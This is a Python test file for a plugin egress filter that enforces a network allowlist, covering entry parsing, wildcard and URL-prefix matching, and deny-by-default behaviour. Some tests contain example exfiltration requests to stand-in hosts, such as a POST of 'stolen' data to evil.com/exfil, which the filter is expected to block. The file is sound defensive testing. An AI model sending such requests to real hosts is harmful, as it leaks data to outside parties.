"""Egress-filter shim tests (``forge_plugin_api.http``).

The Layer-6 egress filter is the boundary that makes capability
declarations meaningful — without it, manifest.toml's ``[capabilities].network``
is just documentation. These tests verify:

  - ``make_http_client()`` reads ``FORGE_NETWORK_ALLOWLIST`` from env
  - non-allowlisted hosts raise ``CapabilityViolation`` *before* any
    network call (so attackers can't exploit "fail open" timing)
  - allow-list entry shapes (bare host, URL prefix, wildcard suffix)
    all match correctly
  - empty allow-list = deny-all, even for localhost
"""

from __future__ import annotations

import httpx
import pytest
from forge_plugin_api.http import (
    CapabilityViolation,
    GuardedAsyncClient,
    _entry_matches,
    _is_allowed,
    make_http_client,
    parse_allowlist,
)

# ---- parse_allowlist ----


def test_parse_allowlist_empty() -> None:
    assert parse_allowlist(None) == []
    assert parse_allowlist("") == []


def test_parse_allowlist_strips_and_splits() -> None:
    raw = " api.github.com , https://api.openai.com/v1/, *.example.com "
    assert parse_allowlist(raw) == [
        "api.github.com",
        "https://api.openai.com/v1/",
        "*.example.com",
    ]


# ---- entry matching ----


def test_bare_hostname_exact_match() -> None:
    assert _entry_matches("https://api.github.com/repos", "api.github.com") is True
    assert _entry_matches("https://attacker.com/api.github.com", "api.github.com") is False


def test_url_prefix_match() -> None:
    entry = "https://api.openai.com/v1/"
    assert _entry_matches("https://api.openai.com/v1/chat/completions", entry) is True
    # Different path prefix → reject (no path-prefix bleed)
    assert _entry_matches("https://api.openai.com/v2/chat/completions", entry) is False
    # Different host → reject
    assert _entry_matches("https://api.evil.com/v1/foo", entry) is False


def test_url_prefix_exact_match_with_trailing_slash_difference() -> None:
    """The shim normalizes trailing slashes so 'https://x/y' and 'https://x/y/' both match."""
    entry = "https://api.openai.com/v1"
    assert _entry_matches("https://api.openai.com/v1", entry) is True
    assert _entry_matches("https://api.openai.com/v1/", entry) is True
    assert _entry_matches("https://api.openai.com/v1/foo", entry) is True


def test_wildcard_subdomain_match() -> None:
    entry = "*.github.com"
    assert _entry_matches("https://api.github.com/x", entry) is True
    assert _entry_matches("https://uploads.github.com/x", entry) is True
    # Apex itself is NOT matched by *.github.com (must be listed separately)
    assert _entry_matches("https://github.com/x", entry) is False


def test_wildcard_does_not_match_other_domain() -> None:
    assert _entry_matches("https://api.example.com/x", "*.github.com") is False


# ---- _is_allowed ----


def test_empty_allowlist_denies_everything() -> None:
    assert _is_allowed("https://localhost/x", []) is False
    assert _is_allowed("http://127.0.0.1/x", []) is False
    assert _is_allowed("https://api.github.com/x", []) is False


def test_allowlist_with_multiple_entries() -> None:
    al = ["api.github.com", "*.openai.com"]
    assert _is_allowed("https://api.github.com/repos/x", al) is True
    assert _is_allowed("https://api.openai.com/v1", al) is True
    assert _is_allowed("https://attacker.com", al) is False


# ---- GuardedAsyncClient.send rejection (no network reached) ----


@pytest.mark.asyncio
async def test_guarded_client_rejects_non_allowlisted() -> None:
    """The send() veto fires before transport — we should NEVER see a
    socket attempt for a non-allowlisted URL."""
    async with GuardedAsyncClient(allowlist=["api.github.com"]) as client:
        with pytest.raises(CapabilityViolation, match=r"evil\.com"):
            await client.get("https://evil.com/exfil")


@pytest.mark.asyncio
async def test_guarded_client_passes_allowlisted_through_transport() -> None:
    """Allowlisted requests reach the transport. We mock the transport so
    no real HTTP fires; the assertion is that the rejection path did NOT
    fire and the response came from our mock."""

    async def handler(request: httpx.Request) -> httpx.Response:
        assert request.url.host == "api.github.com"
        return httpx.Response(200, json={"ok": True})

    transport = httpx.MockTransport(handler)
    async with GuardedAsyncClient(allowlist=["api.github.com"], transport=transport) as client:
        r = await client.get("https://api.github.com/repos")
        assert r.status_code == 200
        assert r.json() == {"ok": True}


@pytest.mark.asyncio
async def test_guarded_client_rejects_subdomain_when_apex_allowlisted() -> None:
    """Bare 'github.com' does NOT auto-grant subdomains — the wildcard
    must be explicit. Tests the principle of least privilege."""
    async with GuardedAsyncClient(allowlist=["github.com"]) as client:
        with pytest.raises(CapabilityViolation):
            await client.get("https://api.github.com/x")


@pytest.mark.asyncio
async def test_guarded_client_post_also_filtered() -> None:
    """The veto fires on every method, not just GET."""
    async with GuardedAsyncClient(allowlist=["api.github.com"]) as client:
        with pytest.raises(CapabilityViolation):
            await client.post("https://evil.com/exfil", json={"data": "stolen"})


# ---- make_http_client (env-driven default allow-list) ----


@pytest.mark.asyncio
async def test_make_http_client_reads_env(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("FORGE_NETWORK_ALLOWLIST", "api.github.com,*.openai.com")
    async with make_http_client() as client:
        assert isinstance(client, GuardedAsyncClient)
        with pytest.raises(CapabilityViolation):
            await client.get("https://attacker.com/x")
        # Allowlisted call would hit the network, so we just check the
        # internal allowlist field — proves env wiring without needing a
        # transport mock.
        assert "api.github.com" in client._forge_allowlist


@pytest.mark.asyncio
async def test_make_http_client_unset_env_denies_all(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Unset FORGE_NETWORK_ALLOWLIST → empty list → deny-all.

    This is the secure default: a plugin that *forgets* to declare network
    capability cannot accidentally exfiltrate anything.
    """
    monkeypatch.delenv("FORGE_NETWORK_ALLOWLIST", raising=False)
    async with make_http_client() as client:
        with pytest.raises(CapabilityViolation):
            await client.get("https://api.github.com/repos")


@pytest.mark.asyncio
async def test_make_http_client_explicit_overrides_env(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """An explicit allowlist passed to make_http_client() overrides env —
    used by reference connectors that want to narrow further than the
    declared scope for a particular call site."""
    monkeypatch.setenv("FORGE_NETWORK_ALLOWLIST", "*.example.com")
    async with make_http_client(allowlist=["api.github.com"]) as client:
        with pytest.raises(CapabilityViolation):
            # example.com is in env, but the explicit list overrode it
            await client.get("https://x.example.com/y")
